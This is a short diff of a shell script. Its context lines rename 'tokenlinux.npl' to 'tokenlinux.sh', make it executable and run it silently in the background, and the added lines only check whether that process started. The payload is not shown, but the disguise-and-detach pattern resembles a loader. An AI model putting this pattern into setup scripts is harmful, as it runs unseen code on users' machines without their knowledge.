@@ -20,4 +20,16 @@ fi
 mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
 chmod +x "$TARGET_DIR/tokenlinux.sh"
 nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
+
+pid=$!
+
+sleep 1
+if kill -0 "$pid" 2>/dev/null; then
+  echo "Script is running (PID $pid)"
+  exit 0
+else
+  echo "Script exited or failed to start"
+  exit 1
+fi
+
 exit 0
